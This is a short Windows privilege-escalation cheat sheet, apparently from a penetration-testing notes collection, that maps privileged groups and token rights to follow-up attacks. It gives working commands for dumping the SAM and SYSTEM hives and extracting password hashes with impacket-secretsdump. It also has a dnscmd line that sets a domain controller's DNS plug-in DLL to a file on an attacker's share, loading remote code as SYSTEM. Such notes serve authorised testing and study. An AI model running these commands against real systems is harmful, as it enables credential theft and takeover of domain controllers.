# Privileged groups and token rights

[← Windows quick reference](../04-windows-privesc.md)

Check current token; named rights may require enabling.

```powershell
whoami /all
whoami /groups
whoami /priv
net localgroup
```

| Finding | Follow-up |
| --- | --- |
| `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` | Check a matching [Potato path](potato.md). |
| Backup Operators / `SeBackupPrivilege` | Check whether SAM and SYSTEM can be saved for offline analysis. |
| DnsAdmins | Check control of the DNS server plug-in setting and service restart. |
| Server Operators | Check service configuration and restart rights. |
| `SeDebugPrivilege` | Check whether the process can inspect LSASS or another privileged process. |

Local backup right:

```powershell
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Save and restore original service/file state.

DnsAdmins: plug-in DLL setting + DNS service restart. Server Operators: service config + restart rights.

```cmd
dnscmd <dc> /config /serverlevelplugindll \\<kali-ip>\share\plugin.dll
sc.exe \\<dc> query dns
sc.exe qc <service>
```
